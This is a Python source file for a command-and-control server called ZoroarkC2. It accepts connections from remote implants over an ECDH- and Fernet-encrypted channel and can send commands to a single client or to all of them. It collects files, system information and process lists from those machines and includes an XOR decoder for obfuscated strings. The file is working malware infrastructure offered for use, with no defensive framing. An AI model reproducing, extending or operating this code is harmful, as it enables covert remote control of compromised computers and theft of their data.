import socket
import os
import sys
import threading
import re
from rich import print
import argparse
import json
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization



DEFAULT_CONFIG = {
    "default_error_color": "red",
    "default_new_connection_color": "green",
    "default_status_online_color": "green",
    "default_status_offline_color": "red",
    "default_connected_clients_color": "green",
    "default_ascii_banner_color": "red"
}

connected_clients_count = 0
status_online = "Offline"
connected_clients = []


def banner():
    print(f"""
[{DEFAULT_CONFIG['default_ascii_banner_color']}]
                  **          %                  
               # %#*%@%*   %##                   
             @#%#########%%%###=    %%#          
        #  **######################%%            
        %%##########################             
       %#######**####################%%          
      ######*##*####%###############%#%#@        
      #####****%%%%%%%############%#%*   #*      
      %##*#*#*#%%%%%%%#%%#%*#**%%%%%%@           
      %***####%%%%%%%###*****#*%%%%%%@           
     ##*%  @%%%%%%%%%******#%%%%%%%%%            
            %%%%%%%#*#%##%%%%%%%%%%%@            
          @%   #@@@##%#     #@@%%%%%             
      %###%%        %#***       #%%+%%%%         
  %****#%           #**##%**%   @+*+%%%%%%       
+#%##*#         @***%#*#%**%**%@%%%%%%%%%%%%    *
 # +         %*******###*#******%%%%%%%%%%%##### 
           *+****#****%##********%%%%%%%%%###*%  
            %*##%         #*******@%%%%%%###     
               @%%%%       %******##%            
               %##%%         **+*#####@          
            #%%***%                #####         
             *%                    #####         
                                  ##%*##@        
                                  * @% @*        
[/{DEFAULT_CONFIG['default_ascii_banner_color']}]
  
""")

XOR_KEY = b"34582070829686405923839211641066"

def xor_decrypt_bytes(data_bytes: bytes, key_bytes: bytes) -> bytes:
    """XOR decrypt eines Bytes-Arrays"""
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data_bytes)])

def decode_xor_string(s: str, key: bytes = XOR_KEY) -> str:
    pattern = r"::XOR::(.*?)::XOR::"

    def repl(match):
        hex_data = match.group(1).replace("-", "")  # Bindestriche entfernen
        try:
            bdata = bytes.fromhex(hex_data)          # Hex -> Bytes
            decrypted = xor_decrypt_bytes(bdata, key)
            return decrypted.decode(errors="ignore") # Bytes -> String
        except:
            return "[XOR DEC ERROR]"

    return re.sub(pattern, repl, s)





def Handle_Client(cd, socket):
    s = cd['socket']
    while status_online == "Online":
        try:
                if not cd['handshake_done']:
                    hdr = s.recv(4)
                    if not hdr:
                        break

                    length = int.from_bytes(hdr, "big")

                    client_pub = b''
                    while len(client_pub) < length:
                        client_pub += s.recv(length - len(client_pub))

                    client_key = serialization.load_pem_public_key(client_pub)

                    shared_secret = cd['private_key'].exchange(ec.ECDH(), client_key)

                    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
                    from cryptography.hazmat.primitives import hashes
                    import base64
                    from cryptography.fernet import Fernet

                    cd['shared_key'] = HKDF(
                        algorithm=hashes.SHA256(),
                        length=32,
                        salt=None,
                        info=b"session"
                    ).derive(shared_secret)

                    cd['fernet'] = Fernet(base64.urlsafe_b64encode(cd['shared_key']))

                    cd['handshake_done'] = True
                    continue
                hdr = s.recv(5)
                if not hdr or len(hdr) < 5:
                    break

                dlen = int.from_bytes(hdr[:4], "big")
                ptype = hdr[4]
                data = b''

                while len(data) < dlen:
                    chunk = s.recv(min(8192, dlen - len(data)))
                    if not chunk:
                        break
                    data += chunk

                if len(data) != dlen:
                    break

                plaintext = cd['fernet'].decrypt(data).decode()

                if ptype == 0:  # Standard Response
                    decoded_data = plaintext
                    print(decoded_data)
                    cd['responses'].append(decoded_data)
                elif ptype == 1:  # Filename Info
                    cd["incoming_filename"] = plaintext
                elif ptype == 2:  # File Content
                    fn = cd.get("incoming_filename", "file.bin")
                    sp = os.path.join("received_files", fn)
                    os.makedirs("received_files", exist_ok=True)
                    with open(sp, "wb") as f:
                        file_bytes = cd['fernet'].decrypt(data)
                        f.write(file_bytes)
                    cd['responses'].append(f"Datei empfangen: {fn}")
                elif ptype == 3:  # SYSTEM INFO
                    decoded_data = plaintext
                    cd['sys_info'] = decoded_data
                    cd['responses'].append("System-Metadaten aktualisiert.")
                elif ptype == 4: # PROCESSES
                    # Entschlüsselt den Prozess-String (z.B. "chrome.exe : 1234")
                    decrypted_proc = plaintext
                    if decrypted_proc:
                        # Wir halten die Liste aktuell. Wenn der Client alle 10s sendet,
                        # fügen wir neue hinzu oder könnten die Liste leeren, falls gewünscht.
                        # Hier: Wir hängen an, verhindern aber Dubletten pro Zyklus.
                        if decrypted_proc not in cd['processes']:
                            cd['processes'].append(decrypted_proc)
                        
                        # Begrenzung, damit der Speicher nicht explodiert (z.B. letzte 500)
                        if len(cd['processes']) > 500:
                            cd['processes'].pop(0)

        except Exception as e:
            print(f"Error handling client {cd['id']}: {e}")
            break

def accept_clients(socket):
    while True:
        try:
            s, addr = socket.accept()
            cd = {
                    'socket': s,
                    'addr': addr,
                    'id': len(connected_clients) + 1,
                    'responses': [],
                    'sys_info': "Warte auf Daten...",
                    'processes': [],  # Liste für ptype 4 initialisieren

                    'private_key': None,
                    'shared_key': None,
                    'handshake_done': False
                }
            server_private = ec.generate_private_key(ec.SECP256R1())
            server_public = server_private.public_key()
            cd["private_key"] = server_private
            pub_bytes = server_public.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            s.send(len(pub_bytes).to_bytes(4, "big") + pub_bytes)
            connected_clients.append(cd)
            print(f"\n[[{DEFAULT_CONFIG['default_new_connection_color']}]OK[/{DEFAULT_CONFIG['default_new_connection_color']}]]NEW CONNECTION!")
            threading.Thread(target=Handle_Client, args=(cd, s), daemon=True).start()
        except:
            break

def start_server(command):
    parts = command.split()
    global status_online
    ip = parts[1]
    port = parts[2]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(5)
    status_online = "Online"
    threading.Thread(target=accept_clients, args=(s,), daemon=True).start()
    
def send_command(command):
    parts = command.split(maxsplit=2)
    if len(parts) < 3:
        print("[red]Error: Invalid format. Usage: <command> <id> <payload> [/red]")
    command1 = parts[0]
    id = parts[1]
    toexec = parts[2]

    if id == "all":
        for client in connected_clients:
            try:
                s = client["socket"]
                if not client.get('handshake_done'):
                    continue
                encrypted = client['fernet'].encrypt(toexec.encode())
                s.send(len(encrypted).to_bytes(4, "big") + encrypted)
            except Exception:
                pass
    else:
        for client in connected_clients:
            clientid = client["id"]
            if clientid == id:
                s = client["socket"]
                if not client.get('handshake_done'):
                    print("Handshake with client is not done yet. Please wait")
                    continue
                encrypted = client['fernet'].encrypt(toexec.encode())
                s.send(len(encrypted).to_bytes(4, "big") + encrypted)
            else:
                continue

def list_clients():
    if not connected_clients:
        print("Currently no connected clients!")
    else:
        for client in connected_clients:
            try:
                print(f"Client ID: {client['id']}")
            except Exception:
                pass

def load_config(path):
    global DEFAULT_CONFIG
    with open(path, "r") as f:
        user_config = json.load(f)
    DEFAULT_CONFIG.update(user_config)
    print("[+] Loaded config")


def load_config_runtime(command):
    parts = command.split()
    if len(parts) >  2:
        print(f"[[{DEFAULT_CONFIG['default_error_color']}]ERROR[/{DEFAULT_CONFIG['default_error_color']}]] to many arguments")
        print("Arguments expected: cload <config path>")
    else:
        load_config(parts[1])


def draw_gui():
    """Clears the screen and draws the main menu interface."""
    os.system('cls' if os.name == 'nt' else 'clear') 
    banner()
    print("Welcome to ZoroarkC2")
    
    currentst = ""

    if status_online == "Offline":
        currentst = f"[{DEFAULT_CONFIG['default_status_offline_color']}]Offline[/{DEFAULT_CONFIG['default_status_offline_color']}]"
    elif status_online == "Online":
        currentst = f"[{DEFAULT_CONFIG['default_status_online_color']}]Online[/{DEFAULT_CONFIG['default_status_online_color']}]"

    print(f"Connected clients: [{DEFAULT_CONFIG['default_connected_clients_color']}]{connected_clients_count}[/{DEFAULT_CONFIG['default_connected_clients_color']}] | Status: {currentst}")
    print("")

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("--config")

    args = parser.parse_args()

    if args.config == None:
        print("No Config provided. Starting with default options")

    else:
        if not os.path.exists(args.config):
            print("File doesn't exist. Couldn't load profile!")
        else:
            print("Config provided. Loading...")
            load_config(args.config)


    draw_gui()
    
    #print(f"[DEBUG] {DEFAULT_CONFIG}")
    while True:
        option = input("root@>     ")
        
        if option == "exit":
            print("Exiting...")
            os.system("cls" if os.name == "nt" else "clear")
            exit(0)
            
        elif option == "help":
            print("You own this code, you know how it works, if you can't read the code then don't use it")
            
        elif option == "clear":
            draw_gui()
            
        elif option.startswith("CStart"):
            print("Starting server...")
            start_server(option)
            draw_gui()
        elif option.startswith("send"):
            send_command(option)
        elif option == "Clients":
            list_clients()
        elif option.startswith("cload"):
            load_config_runtime(option)
            draw_gui()





if __name__ == "__main__":
    main()